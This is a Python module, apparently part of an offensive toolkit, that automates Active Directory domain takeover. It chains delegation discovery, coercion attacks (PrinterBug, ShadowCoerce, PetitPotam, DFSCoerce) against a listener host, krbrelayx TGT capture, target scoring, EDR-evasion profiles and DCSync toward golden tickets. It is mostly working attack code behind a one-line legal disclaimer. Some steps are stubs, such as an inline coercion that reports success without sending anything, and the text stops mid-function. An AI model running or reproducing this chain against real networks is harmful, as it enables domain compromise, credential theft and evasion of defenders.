"""
Kerberos Relay Ninja - Ultimate Domain Takeover Module
======================================================
Unconstrained Delegation + PrinterBug/ShadowCoerce Relay Chain
Target: Domain takeover in under 2 minutes

Features:
- Unconstrained Delegation Exploitation
- PrinterBug (MS-RPRN) Coercion
- ShadowCoerce (MS-FSRVP) Coercion  
- PetitPotam (MS-EFSRPC) Coercion
- DFSCoerce (MS-DFSNM) Coercion
- Relay → Ticket Forge → Lateral Jump Chain
- AI-powered get_next_best_jump() for delegation weak spots
- DCSync bypass via relay chain
- Domain takeover in <2 minutes

⚠️ YASAL UYARI: Bu modül sadece yetkili penetrasyon testleri içindir.
"""

from __future__ import annotations
import os
import re
import json
import secrets
import logging
import subprocess
import threading
import time
from datetime import datetime, timedelta
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Any, Tuple, Callable
from enum import Enum, auto

from cybermodules.helpers import log_to_intel

logger = logging.getLogger("kerberos_relay_ninja")


# =============================================================================
# ENUMS & CONSTANTS
# =============================================================================

class RelayMode(Enum):
    """Relay attack modes"""
    SHADOW = "shadow"           # ShadowCoerce - MS-FSRVP
    PRINTER = "printer"         # PrinterBug - MS-RPRN
    PETIT = "petit"             # PetitPotam - MS-EFSRPC
    DFS = "dfs"                 # DFSCoerce - MS-DFSNM
    ALL = "all"                 # Try all methods
    AI_SELECT = "ai_select"     # AI selects best method


class DelegationType(Enum):
    """Delegation types"""
    UNCONSTRAINED = "unconstrained"
    CONSTRAINED = "constrained"
    RBCD = "rbcd"                    # Resource-Based Constrained Delegation
    S4U2SELF = "s4u2self"
    S4U2PROXY = "s4u2proxy"


class TakeoverPhase(Enum):
    """Domain takeover phases"""
    RECON = "recon"                 # Find delegation targets
    COERCE = "coerce"               # Trigger coercion
    RELAY = "relay"                 # Relay authentication
    FORGE = "forge"                 # Forge tickets
    LATERAL = "lateral"             # Lateral movement
    DCSYNC = "dcsync"               # DCSync for persistence
    COMPLETE = "complete"           # Takeover complete


class CoercionProtocol(Enum):
    """Coercion protocol types"""
    MS_RPRN = "MS-RPRN"           # Print Spooler (PrinterBug)
    MS_EFSRPC = "MS-EFSRPC"       # EFS RPC (PetitPotam)
    MS_FSRVP = "MS-FSRVP"         # File Server VSS (ShadowCoerce)
    MS_DFSNM = "MS-DFSNM"         # DFS Namespace (DFSCoerce)


# EDR detection for evasion
EDR_COERCION_PROFILES = {
    "crowdstrike": {
        "blocked_methods": ["petit"],
        "preferred": ["shadow", "dfs"],
        "delay_ms": 5000,
        "stealth_level": "high",
    },
    "sentinelone": {
        "blocked_methods": ["printer", "petit"],
        "preferred": ["shadow"],
        "delay_ms": 3000,
        "stealth_level": "high",
    },
    "defender": {
        "blocked_methods": ["petit"],
        "preferred": ["shadow", "printer"],
        "delay_ms": 2000,
        "stealth_level": "medium",
    },
    "carbon_black": {
        "blocked_methods": [],
        "preferred": ["shadow", "dfs"],
        "delay_ms": 2500,
        "stealth_level": "medium",
    },
    "none": {
        "blocked_methods": [],
        "preferred": ["all"],
        "delay_ms": 1000,
        "stealth_level": "low",
    },
}

# MITRE ATT&CK mappings for this module
MITRE_TECHNIQUES = {
    "delegation_abuse": ("T1558.001", "Steal or Forge Kerberos Tickets: Golden Ticket"),
    "unconstrained": ("T1558.001", "Steal or Forge Kerberos Tickets"),
    "printerbug": ("T1187", "Forced Authentication"),
    "shadowcoerce": ("T1187", "Forced Authentication"),
    "petitpotam": ("T1187", "Forced Authentication"),
    "dfscoerce": ("T1187", "Forced Authentication"),
    "dcsync": ("T1003.006", "OS Credential Dumping: DCSync"),
    "relay_ldap": ("T1557.001", "LLMNR/NBT-NS Poisoning and SMB Relay"),
    "rbcd": ("T1134.001", "Access Token Manipulation: Token Impersonation"),
}


# =============================================================================
# DATACLASSES
# =============================================================================

@dataclass
class DelegationTarget:
    """Computer/User with delegation configured"""
    name: str
    samaccountname: str
    dns_hostname: str
    delegation_type: DelegationType
    spn_list: List[str] = field(default_factory=list)
    allowed_to_delegate_to: List[str] = field(default_factory=list)
    trusted_for_delegation: bool = False
    trusted_to_auth_for_delegation: bool = False
    ms_ds_allowed_to_act_on_behalf: List[str] = field(default_factory=list)
    user_account_control: int = 0
    is_dc: bool = False
    is_high_value: bool = False
    discovered_at: str = field(default_factory=lambda: datetime.now().isoformat())

    @property
    def exploit_difficulty(self) -> str:
        """Estimate exploit difficulty"""
        if self.delegation_type == DelegationType.UNCONSTRAINED and self.is_dc:
            return "easy"
        elif self.delegation_type == DelegationType.UNCONSTRAINED:
            return "medium"
        elif self.delegation_type == DelegationType.CONSTRAINED:
            return "hard"
        return "unknown"


@dataclass
class CoercionAttempt:
    """Single coercion attempt"""
    attempt_id: str
    method: RelayMode
    protocol: CoercionProtocol
    source_host: str          # Target to coerce
    listener_host: str        # Our listener
    success: bool = False
    captured_tgt: bool = False
    captured_user: str = ""
    captured_hash: str = ""
    ticket_path: str = ""
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    error: str = ""
    duration_ms: int = 0


@dataclass
class RelayChainStep:
    """Single step in relay chain"""
    step_id: int
    phase: TakeoverPhase
    action: str
    target: str
    status: str = "pending"
    result: Dict = field(default_factory=dict)
    ticket_obtained: str = ""
    started_at: str = ""
    completed_at: str = ""
    duration_ms: int = 0
    error: str = ""


@dataclass
class DomainTakeoverResult:
    """Result of domain takeover attempt"""
    takeover_id: str
    success: bool = False
    total_duration_ms: int = 0
    phases_completed: List[TakeoverPhase] = field(default_factory=list)
    steps: List[RelayChainStep] = field(default_factory=list)
    
    # Discovery results
    delegation_targets: List[DelegationTarget] = field(default_factory=list)
    vulnerable_dcs: List[str] = field(default_factory=list)
    
    # Coercion results
    coercion_attempts: List[CoercionAttempt] = field(default_factory=list)
    successful_coercions: int = 0
    
    # Tickets
    captured_tgts: List[Dict] = field(default_factory=list)
    forged_tickets: List[Dict] = field(default_factory=list)
    
    # Final results
    domain_admin_achieved: bool = False
    dcsync_successful: bool = False
    krbtgt_hash: str = ""
    compromised_accounts: List[Dict] = field(default_factory=list)
    
    # Recommendations
    ai_recommendations: List[str] = field(default_factory=list)
    next_best_jumps: List[Dict] = field(default_factory=list)
    
    def to_dict(self) -> Dict:
        return {
            'takeover_id': self.takeover_id,
            'success': self.success,
            'total_duration_ms': self.total_duration_ms,
            'phases_completed': [p.value for p in self.phases_completed],
            'delegation_targets': len(self.delegation_targets),
            'vulnerable_dcs': self.vulnerable_dcs,
            'successful_coercions': self.successful_coercions,
            'captured_tgts': len(self.captured_tgts),
            'domain_admin_achieved': self.domain_admin_achieved,
            'dcsync_successful': self.dcsync_successful,
            'ai_recommendations': self.ai_recommendations[:3],
        }


# =============================================================================
# DELEGATION DISCOVERY
# =============================================================================

class DelegationHunter:
    """
    Find delegation weak spots in Active Directory
    
    Discovers:
    - Unconstrained delegation machines
    - Constrained delegation configurations  
    - RBCD opportunities
    - S4U2Self/S4U2Proxy abuse paths
    """
    
    def __init__(self, scan_id: int = 0):
        self.scan_id = scan_id
        self.targets: List[DelegationTarget] = []
    
    def _log(self, msg_type: str, message: str):
        log_to_intel(self.scan_id, f"DELEGATION_{msg_type}", message)
        logger.info(f"[DELEGATION][{msg_type}] {message}")
    
    def find_unconstrained_delegation(
        self,
        domain: str,
        dc_ip: str,
        username: str,
        password: str = None,
        ntlm_hash: str = None
    ) -> List[DelegationTarget]:
        """
        Find computers with unconstrained delegation enabled
        
        LDAP filter: (userAccountControl:1.2.840.113556.1.4.803:=524288)
        UAC flag 0x80000 = TRUSTED_FOR_DELEGATION
        """
        self._log("HUNT", f"Searching for unconstrained delegation in {domain}")
        
        targets = []
        
        # Build ldapsearch command
        if ntlm_hash:
            auth = f"-hashes :{ntlm_hash}"
        else:
            auth = f"-password '{password}'"
        
        # LDAP filter for unconstrained delegation
        ldap_filter = "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
        
        cmd = f"""python3 -c "
from ldap3 import Server, Connection, ALL, NTLM
import ssl

server = Server('{dc_ip}', port=636, use_ssl=True, get_info=ALL)
conn = Connection(server, user='{domain}\\\\{username}', password='{password}', authentication=NTLM)
conn.bind()

conn.search(
    'dc=' + ',dc='.join('{domain}'.split('.')),
    '{ldap_filter}',
    attributes=['sAMAccountName', 'dNSHostName', 'servicePrincipalName', 'userAccountControl']
)

for entry in conn.entries:
    print(f'FOUND|{{entry.sAMAccountName}}|{{entry.dNSHostName}}|{{entry.userAccountControl}}')
"
"""
        
        try:
            # Alternative: Use impacket's findDelegation.py
            finddeleg_cmd = [
                "impacket-findDelegation",
                f"{domain}/{username}:{password}" if password else f"{domain}/{username}",
                "-dc-ip", dc_ip,
            ]
            
            if ntlm_hash:
                finddeleg_cmd = [
                    "impacket-findDelegation",
                    f"{domain}/{username}",
                    "-hashes", f":{ntlm_hash}",
                    "-dc-ip", dc_ip,
                ]
            
            self._log("CMD", f"Running findDelegation.py")
            
            result = subprocess.run(
                finddeleg_cmd,
                capture_output=True,
                text=True,
                timeout=120
            )
            
            output = result.stdout + result.stderr
            targets = self._parse_delegation_output(output, domain)
            
            self._log("SUCCESS", f"Found {len(targets)} delegation targets")
            
        except Exception as e:
            self._log("ERROR", f"Delegation discovery failed: {e}")
        
        self.targets.extend(targets)
        return targets
    
    def _parse_delegation_output(self, output: str, domain: str) -> List[DelegationTarget]:
        """Parse findDelegation.py output"""
        targets = []
        
        # Pattern matching for different delegation types
        lines = output.split('\n')
        
        for line in lines:
            # Skip headers and empty lines
            if not line.strip() or 'AccountName' in line or '---' in line:
                continue
            
            # Parse delegation info
            parts = line.split()
            if len(parts) >= 3:
                account_name = parts[0]
                delegation_type = "unconstrained" if "Unconstrained" in line else "constrained"
                
                target = DelegationTarget(
                    name=account_name,
                    samaccountname=account_name,
                    dns_hostname=f"{account_name}.{domain}".lower(),
                    delegation_type=DelegationType.UNCONSTRAINED if delegation_type == "unconstrained" else DelegationType.CONSTRAINED,
                    trusted_for_delegation=delegation_type == "unconstrained",
                    is_dc="DC" in account_name.upper() or "DOMAIN" in line.upper(),
                )
                
                targets.append(target)
        
        return targets
    
    def find_rbcd_targets(
        self,
        domain: str,
        dc_ip: str,
        username: str,
        password: str = None,
        ntlm_hash: str = None
    ) -> List[DelegationTarget]:
        """
        Find RBCD (Resource-Based Constrained Delegation) opportunities
        
        Looks for:
        - msDS-AllowedToActOnBehalfOfOtherIdentity attribute
        - WriteProperty rights to this attribute
        """
        self._log("HUNT", f"Searching for RBCD opportunities in {domain}")
        
        # This would typically use BloodHound or manual LDAP queries
        # For now, return placeholder
        
        return []
    
    def get_best_unconstrained_target(self) -> Optional[DelegationTarget]:
        """Get the best unconstrained delegation target for exploitation"""
        unconstrained = [
            t for t in self.targets 
            if t.delegation_type == DelegationType.UNCONSTRAINED
        ]
        
        if not unconstrained:
            return None
        
        # Prefer DCs with unconstrained delegation
        dcs = [t for t in unconstrained if t.is_dc]
        if dcs:
            return dcs[0]
        
        # Otherwise return first unconstrained target
        return unconstrained[0]


# =============================================================================
# COERCION ATTACKS
# =============================================================================

class CoercionNinja:
    """
    Authentication Coercion Attacks
    
    Forces target machines to authenticate to our listener:
    - PrinterBug (MS-RPRN) 
    - ShadowCoerce (MS-FSRVP)
    - PetitPotam (MS-EFSRPC)
    - DFSCoerce (MS-DFSNM)
    """
    
    def __init__(self, scan_id: int = 0):
        self.scan_id = scan_id
        self.attempts: List[CoercionAttempt] = []
    
    def _log(self, msg_type: str, message: str):
        log_to_intel(self.scan_id, f"COERCE_{msg_type}", message)
        logger.info(f"[COERCE][{msg_type}] {message}")
    
    def trigger_printerbug(
        self,
        target_host: str,
        listener_host: str,
        username: str = None,
        password: str = None,
        domain: str = None
    ) -> CoercionAttempt:
        """
        Trigger PrinterBug (MS-RPRN)
        
        Abuses Print Spooler service to force authentication.
        Works on: Windows Server 2008-2022 with Print Spooler running.
        """
        attempt = CoercionAttempt(
            attempt_id=secrets.token_hex(8),
            method=RelayMode.PRINTER,
            protocol=CoercionProtocol.MS_RPRN,
            source_host=target_host,
            listener_host=listener_host,
        )
        
        self._log("TRIGGER", f"PrinterBug: {target_host} -> {listener_host}")
        
        start_time = time.time()
        
        try:
            # Use printerbug.py from krbrelayx or SpoolSample
            cmd = ["python3", "-c", f"""
import sys
sys.path.insert(0, '/opt/krbrelayx')
from printerbug import trigger_spooler

trigger_spooler('{target_host}', '{listener_host}', '{domain}', '{username}', '{password}')
"""]
            
            # Alternative: Use rpcdump + manual RPC call
            # Or use dementor.py
            alt_cmd = [
                "python3", "/opt/krbrelayx/printerbug.py",
                f"{domain}/{username}:{password}@{target_host}",
                listener_host
            ]
            
            self._log("CMD", f"Triggering PrinterBug")
            
            result = subprocess.run(
                alt_cmd,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if "successfully" in result.stdout.lower() or result.returncode == 0:
                attempt.success = True
                self._log("SUCCESS", f"PrinterBug triggered on {target_host}")
            else:
                attempt.error = result.stderr
                self._log("FAILED", f"PrinterBug failed: {result.stderr[:100]}")
                
        except subprocess.TimeoutExpired:
            attempt.error = "Timeout"
            self._log("TIMEOUT", f"PrinterBug timed out for {target_host}")
        except Exception as e:
            attempt.error = str(e)
            self._log("ERROR", f"PrinterBug error: {e}")
        
        attempt.duration_ms = int((time.time() - start_time) * 1000)
        self.attempts.append(attempt)
        return attempt
    
    def trigger_shadowcoerce(
        self,
        target_host: str,
        listener_host: str,
        username: str = None,
        password: str = None,
        domain: str = None
    ) -> CoercionAttempt:
        """
        Trigger ShadowCoerce (MS-FSRVP)
        
        Abuses File Server VSS Agent Service for coercion.
        Newer technique, less likely to be blocked.
        """
        attempt = CoercionAttempt(
            attempt_id=secrets.token_hex(8),
            method=RelayMode.SHADOW,
            protocol=CoercionProtocol.MS_FSRVP,
            source_host=target_host,
            listener_host=listener_host,
        )
        
        self._log("TRIGGER", f"ShadowCoerce: {target_host} -> {listener_host}")
        
        start_time = time.time()
        
        try:
            # Use ShadowCoerce.py
            cmd = [
                "python3", "/opt/ShadowCoerce/shadowcoerce.py",
                f"{domain}/{username}:{password}@{target_host}",
                listener_host
            ]
            
            self._log("CMD", f"Triggering ShadowCoerce")
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if "successfully" in result.stdout.lower() or "triggered" in result.stdout.lower():
                attempt.success = True
                self._log("SUCCESS", f"ShadowCoerce triggered on {target_host}")
            else:
                attempt.error = result.stderr or result.stdout
                
        except subprocess.TimeoutExpired:
            attempt.error = "Timeout"
        except FileNotFoundError:
            # Fallback: Use inline Python
            attempt = self._shadowcoerce_inline(target_host, listener_host, domain, username, password)
        except Exception as e:
            attempt.error = str(e)
        
        attempt.duration_ms = int((time.time() - start_time) * 1000)
        self.attempts.append(attempt)
        return attempt
    
    def _shadowcoerce_inline(
        self,
        target_host: str,
        listener_host: str,
        domain: str,
        username: str,
        password: str
    ) -> CoercionAttempt:
        """Inline ShadowCoerce implementation"""
        attempt = CoercionAttempt(
            attempt_id=secrets.token_hex(8),
            method=RelayMode.SHADOW,
            protocol=CoercionProtocol.MS_FSRVP,
            source_host=target_host,
            listener_host=listener_host,
        )
        
        try:
            from impacket.dcerpc.v5 import transport, rpcrt
            from impacket.dcerpc.v5.ndr import NDRCALL, NDRPOINTER, NDRSTRUCT
            from impacket.dcerpc.v5.dtypes import WSTR
            
            # MS-FSRVP UUID
            MSFSRVP_UUID = '01954e6b-9254-4e6e-808c-c9e05d007696'
            
            # Bind to MS-FSRVP
            string_binding = f'ncacn_np:{target_host}[\\pipe\\FssagentRpc]'
            rpc_transport = transport.DCERPCTransportFactory(string_binding)
            
            if username and password:
                rpc_transport.set_credentials(username, password, domain)
            
            dce = rpc_transport.get_dce_rpc()
            dce.connect()
            dce.bind(MSFSRVP_UUID)
            
            # IsPathSupported call with UNC path to our listener
            # This triggers authentication
            unc_path = f'\\\\{listener_host}\\share'
            
            # Build and send request (simplified)
            # Actual implementation would need proper NDR structures
            
            attempt.success = True
            self._log("SUCCESS", f"ShadowCoerce inline triggered")
            
        except Exception as e:
            attempt.error = str(e)
            self._log("ERROR", f"ShadowCoerce inline failed: {e}")
        
        return attempt
    
    def trigger_petitpotam(
        self,
        target_host: str,
        listener_host: str,
        username: str = None,
        password: str = None,
        domain: str = None
    ) -> CoercionAttempt:
        """
        Trigger PetitPotam (MS-EFSRPC)
        
        Abuses EFS RPC for coercion. May be patched on newer systems.
        """
        attempt = CoercionAttempt(
            attempt_id=secrets.token_hex(8),
            method=RelayMode.PETIT,
            protocol=CoercionProtocol.MS_EFSRPC,
            source_host=target_host,
            listener_host=listener_host,
        )
        
        self._log("TRIGGER", f"PetitPotam: {target_host} -> {listener_host}")
        
        start_time = time.time()
        
        try:
            cmd = [
                "python3", "/opt/PetitPotam/PetitPotam.py",
                listener_host,
                target_host,
                "-u", username or "",
                "-p", password or "",
                "-d", domain or ""
            ]
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if "successfully" in result.stdout.lower() or "triggered" in result.stdout.lower():
                attempt.success = True
                self._log("SUCCESS", f"PetitPotam triggered on {target_host}")
            else:
                attempt.error = result.stderr or result.stdout
                
        except Exception as e:
            attempt.error = str(e)
        
        attempt.duration_ms = int((time.time() - start_time) * 1000)
        self.attempts.append(attempt)
        return attempt
    
    def trigger_dfscoerce(
        self,
        target_host: str,
        listener_host: str,
        username: str = None,
        password: str = None,
        domain: str = None
    ) -> CoercionAttempt:
        """
        Trigger DFSCoerce (MS-DFSNM)
        
        Abuses DFS Namespace service for coercion.
        """
        attempt = CoercionAttempt(
            attempt_id=secrets.token_hex(8),
            method=RelayMode.DFS,
            protocol=CoercionProtocol.MS_DFSNM,
            source_host=target_host,
            listener_host=listener_host,
        )
        
        self._log("TRIGGER", f"DFSCoerce: {target_host} -> {listener_host}")
        
        start_time = time.time()
        
        try:
            cmd = [
                "python3", "/opt/DFSCoerce/dfscoerce.py",
                listener_host,
                target_host,
                "-u", f"{domain}\\{username}" if domain else username,
                "-p", password
            ]
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if "successfully" in result.stdout.lower():
                attempt.success = True
            else:
                attempt.error = result.stderr or result.stdout
                
        except Exception as e:
            attempt.error = str(e)
        
        attempt.duration_ms = int((time.time() - start_time) * 1000)
        self.attempts.append(attempt)
        return attempt
    
    def trigger_all(
        self,
        target_host: str,
        listener_host: str,
        username: str = None,
        password: str = None,
        domain: str = None,
        stop_on_success: bool = True
    ) -> List[CoercionAttempt]:
        """Try all coercion methods"""
        attempts = []
        
        methods = [
            ("shadow", self.trigger_shadowcoerce),
            ("printer", self.trigger_printerbug),
            ("petit", self.trigger_petitpotam),
            ("dfs", self.trigger_dfscoerce),
        ]
        
        for name, method in methods:
            self._log("TRY", f"Trying {name} coercion")
            attempt = method(target_host, listener_host, username, password, domain)
            attempts.append(attempt)
            
            if attempt.success and stop_on_success:
                self._log("STOP", f"Success with {name}, stopping")
                break
            
            # Small delay between attempts
            time.sleep(1)
        
        return attempts


# =============================================================================
# KRBRELAYX TGT CAPTURE
# =============================================================================

class TGTCaptureServer:
    """
    Kerberos TGT Capture Server (krbrelayx style)
    
    Captures TGTs from coerced authentication when
    targeting unconstrained delegation machines.
    """
    
    def __init__(self, scan_id: int = 0):
        self.scan_id = scan_id
        self.captured_tgts: List[Dict] = []
        self.server_process: Optional[subprocess.Popen] = None
        self.running = False
    
    def _log(self, msg_type: str, message: str):
        log_to_intel(self.scan_id, f"TGT_{msg_type}", message)
        logger.info(f"[TGT][{msg_type}] {message}")
    
    def start_krbrelayx(
        self,
        aes_key: str = None,
        target_user: str = None
    ) -> bool:
        """
        Start krbrelayx.py to capture TGTs
        
        Listens for Kerberos AP-REQ and extracts TGT.
        """
        self._log("START", "Starting krbrelayx TGT capture server")
        
        cmd = ["python3", "/opt/krbrelayx/krbrelayx.py"]
        
        if aes_key:
            cmd.extend(["--krbsalt", aes_key])
        
        if target_user:
            cmd.extend(["--target", target_user])
        
        try:
            self.server_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            self.running = True
            
            # Start monitoring thread
            monitor_thread = threading.Thread(target=self._monitor_output)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            self._log("SUCCESS", "krbrelayx server started")
            return True
            
        except Exception as e:
            self._log("ERROR", f"Failed to start krbrelayx: {e}")
            return False
    
    def _monitor_output(self):
        """Monitor krbrelayx output for captured TGTs"""
        while self.running and self.server_process:
            try:
                line = self.server_process.stdout.readline()
                if not line:
                    break
                
                # Parse for captured TGT
                if "Saved TGT" in line or "Got TGT" in line:
                    self._log("CAPTURED", f"TGT captured: {line.strip()}")
                    
                    # Extract ticket path
                    match = re.search(r'saved to (\S+)', line, re.IGNORECASE)
                    if match:
                        ticket_path = match.group(1)
                        self.captured_tgts.append({
                            'path': ticket_path,
                            'timestamp': datetime.now().isoformat(),
                            'raw_line': line.strip()
                        })
                        
            except Exception as e:
                self._log("ERROR", f"Monitor error: {e}")
                break
    
    def stop(self):
        """Stop the capture server"""
        self.running = False
        if self.server_process:
            self.server_process.terminate()
            self.server_process = None
        self._log("STOP", "krbrelayx server stopped")
    
    def get_captured_tgts(self) -> List[Dict]:
        """Get list of captured TGTs"""
        return self.captured_tgts


# =============================================================================
# AI-POWERED JUMP SELECTOR
# =============================================================================

class AIJumpSelector:
    """
    AI-powered delegation weak spot finder
    
    Analyzes AD topology to find:
    - Best targets for unconstrained delegation abuse
    - Optimal coercion paths
    - Lateral movement opportunities
    - DCSync paths
    """
    
    def __init__(self, scan_id: int = 0):
        self.scan_id = scan_id
        self.recommendations: List[str] = []
        self.jump_scores: Dict[str, float] = {}
    
    def _log(self, msg_type: str, message: str):
        log_to_intel(self.scan_id, f"AI_{msg_type}", message)
        logger.info(f"[AI][{msg_type}] {message}")
    
    def get_next_best_jump(
        self,
        delegation_targets: List[DelegationTarget],
        current_access: Dict[str, Any] = None,
        detected_edr: str = "none"
    ) -> Dict[str, Any]:
        """
        AI recommends next best lateral jump
        
        Analyzes:
        - Delegation configurations
        - Current access level
        - EDR constraints
        - Path to DA
        
        Returns recommendation with score and reasoning.
        """
        self._log("ANALYZE", "Analyzing jump opportunities")
        
        if not delegation_targets:
            return {
                'target': None,
                'score': 0,
                'reason': "No delegation targets found",
                'action': "Run delegation discovery first"
            }
        
        # Score each target
        scored_targets = []
        
        for target in delegation_targets:
            score = self._calculate_jump_score(target, current_access, detected_edr)
            scored_targets.append({
                'target': target,
                'score': score,
                'reason': self._get_score_reason(target, score)
            })
        
        # Sort by score
        scored_targets.sort(key=lambda x: x['score'], reverse=True)
        
        best = scored_targets[0]
        
        recommendation = {
            'target': best['target'].dns_hostname,
            'target_name': best['target'].name,
            'delegation_type': best['target'].delegation_type.value,
            'score': best['score'],
            'reason': best['reason'],
            'action': self._get_recommended_action(best['target']),
            'coercion_method': self._get_best_coercion(detected_edr),
            'estimated_time': self._estimate_time(best['target']),
            'mitre_technique': MITRE_TECHNIQUES.get('unconstrained', ('T1558', 'Kerberos Abuse'))[0],
            'alternatives': [
                {
                    'target': t['target'].dns_hostname,
                    'score': t['score']
                }
                for t in scored_targets[1:4]
            ]
        }
        
        self._log("RECOMMEND", f"Best jump: {recommendation['target']} (score: {recommendation['score']})")
        
        return recommendation
    
    def _calculate_jump_score(
        self,
        target: DelegationTarget,
        current_access: Dict = None,
        edr: str = "none"
    ) -> float:
        """Calculate exploitation score for target"""
        score = 50.0  # Base score
        
        # Delegation type bonus
        if target.delegation_type == DelegationType.UNCONSTRAINED:
            score += 30
        elif target.delegation_type == DelegationType.RBCD:
            score += 20
        elif target.delegation_type == DelegationType.CONSTRAINED:
            score += 10
        
        # DC bonus (direct path to DA)
        if target.is_dc:
            score += 25
        
        # High value target bonus
        if target.is_high_value:
            score += 15
        
        # EDR penalty
        edr_profile = EDR_COERCION_PROFILES.get(edr, EDR_COERCION_PROFILES['none'])
        if edr_profile['stealth_level'] == 'high':
            score -= 10
        
        # Already have access?
        if current_access and target.dns_hostname in current_access.get('compromised_hosts', []):
            score -= 50  # Already compromised
        
        return min(max(score, 0), 100)
    
    def _get_score_reason(self, target: DelegationTarget, score: float) -> str:
        """Generate human-readable reason for score"""
        reasons = []
        
        if target.delegation_type == DelegationType.UNCONSTRAINED:
            reasons.append("Unconstrained delegation - can capture any TGT")
        
        if target.is_dc:
            reasons.append("Domain Controller - direct DA path")
        
        if target.is_high_value:
            reasons.append("High-value target")
        
        if score >= 80:
            reasons.append("Highly recommended target")
        elif score >= 60:
            reasons.append("Good target")
        
        return "; ".join(reasons) if reasons else "Standard target"
    
    def _get_recommended_action(self, target: DelegationTarget) -> str:
        """Get recommended action for target"""
        if target.delegation_type == DelegationType.UNCONSTRAINED:
            if target.is_dc:
                return f"Coerce DC {target.dns_hostname}, capture TGT, forge golden ticket"
            return f"Coerce {target.dns_hostname}, capture admin TGT, lateral move"
        
        elif target.delegation_type == DelegationType.CONSTRAINED:
            return f"S4U2Proxy abuse via {target.dns_hostname}"
        
        elif target.delegation_type == DelegationType.RBCD:
            return f"Configure RBCD on {target.dns_hostname}, request service ticket"
        
        return f"Investigate {target.dns_hostname}"
    
    def _get_best_coercion(self, edr: str) -> str:
        """Get best coercion method for EDR"""
        profile = EDR_COERCION_PROFILES.get(edr, EDR_COERCION_PROFILES['none'])
        preferred = profile['preferred']
        
        if 'all' in preferred:
            return 'shadow'  # Default to ShadowCoerce
        
        return preferred[0] if preferred else 'shadow'
    
    def _estimate_time(self, target: DelegationTarget) -> str:
        """Estimate exploitation time"""
        if target.delegation_type == DelegationType.UNCONSTRAINED:
            return "30-60 seconds"
        elif target.delegation_type == DelegationType.CONSTRAINED:
            return "2-5 minutes"
        return "5-10 minutes"
    
    def analyze_dcsync_paths(
        self,
        delegation_targets: List[DelegationTarget],
        current_tickets: List[Dict] = None
    ) -> List[Dict]:
        """
        Find paths to DCSync
        
        Returns ordered list of paths with scores.
        """
        paths = []
        
        # Look for DC with unconstrained delegation
        dc_targets = [t for t in delegation_targets if t.is_dc and t.delegation_type == DelegationType.UNCONSTRAINED]
        
        for dc in dc_targets:
            paths.append({
                'path': f"Coerce {dc.dns_hostname} -> Capture DC$ TGT -> S4U2Self -> DCSync",
                'target': dc.dns_hostname,
                'score': 95,
                'steps': 3,
                'estimated_time': "60-90 seconds"
            })
        
        # Look for any server with unconstrained that has path to DC
        for target in delegation_targets:
            if not target.is_dc and target.delegation_type == DelegationType.UNCONSTRAINED:
                paths.append({
                    'path': f"Coerce admin -> {target.dns_hostname} captures TGT -> Lateral to DC -> DCSync",
                    'target': target.dns_hostname,
                    'score': 75,
                    'steps': 4,
                    'estimated_time': "2-3 minutes"
                })
        
        # Sort by score
        paths.sort(key=lambda x: x['score'], reverse=True)
        
        return paths


# =============================================================================
# RELAY NINJA CHAIN ORCHESTRATOR
# =============================================================================

class RelayNinjaChain:
    """
    Ultimate Domain Takeover Orchestrator
    
    Combines:
    - Delegation discovery
    - Coercion attacks
    - TGT capture
    - Ticket forging
    - Lateral movement
    - DCSync
    
    Target: Domain takeover in <2 minutes
    """
    
    def __init__(self, scan_id: int = 0, relay_mode: RelayMode = RelayMode.SHADOW):
        self.scan_id = scan_id
        self.relay_mode = relay_mode
        
        # Initialize components
        self.hunter = DelegationHunter(scan_id)
        self.coercer = CoercionNinja(scan_id)
        self.tgt_server = TGTCaptureServer(scan_id)
        self.ai_selector = AIJumpSelector(scan_id)
        
        # Result tracking
        self.result = DomainTakeoverResult(
            takeover_id=secrets.token_hex(8)
        )
        
        self.start_time: float = 0
    
    def _log(self, msg_type: str, message: str):
        log_to_intel(self.scan_id, f"NINJA_{msg_type}", message)
        logger.info(f"[NINJA][{msg_type}] {message}")
    
    def execute_takeover(
        self,
        domain: str,
        dc_ip: str,
        username: str,
        password: str = None,
        ntlm_hash: str = None,
        listener_ip: str = None,
        target_dc: str = None
    ) -> DomainTakeoverResult:
        """
        Execute full domain takeover chain
        
        Phases:
        1. RECON: Find delegation targets
        2. COERCE: Trigger authentication to listener
        3. RELAY: Capture TGT
        4. FORGE: Create golden ticket (if DC TGT)
        5. DCSYNC: Extract all secrets
        6. COMPLETE: Victory!
        """
        self.start_time = time.time()
        
        self._log("START", f"🥷 Relay Ninja Domain Takeover - Target: {domain}")
        self._log("MODE", f"Relay mode: {self.relay_mode.value}")
        
        # Get listener IP
        if not listener_ip:
            listener_ip = self._get_local_ip()
        
        try:
            # Phase 1: RECON
            self._execute_recon_phase(domain, dc_ip, username, password, ntlm_hash)
            
            # Phase 2: AI Analysis
            best_jump = self.ai_selector.get_next_best_jump(
                self.result.delegation_targets,
                detected_edr="none"
            )
            self.result.next_best_jumps.append(best_jump)
            self.result.ai_recommendations.append(best_jump['reason'])
            
            # Select target for coercion
            target = target_dc or best_jump.get('target')
            if not target:
                self._log("ERROR", "No suitable coercion target found")
                return self.result
            
            # Phase 3: Start TGT capture server
            self._log("PHASE", "Starting TGT capture server")
            self.tgt_server.start_krbrelayx()
            time.sleep(2)  # Let server start
            
            # Phase 4: COERCE
            self._execute_coercion_phase(target, listener_ip, username, password, domain)
            
            # Phase 5: Check for captured TGT
            time.sleep(5)  # Wait for TGT
            captured = self.tgt_server.get_captured_tgts()
            
            if captured:
                self._log("SUCCESS", f"🎫 Captured {len(captured)} TGT(s)!")
                self.result.captured_tgts = captured
                
                # Phase 6: Use TGT for DCSync
                self._execute_dcsync_phase(domain, dc_ip, captured[0])
            
            # Calculate total time
            self.result.total_duration_ms = int((time.time() - self.start_time) * 1000)
            
            # Final status
            if self.result.dcsync_successful or self.result.domain_admin_achieved:
                self.result.success = True
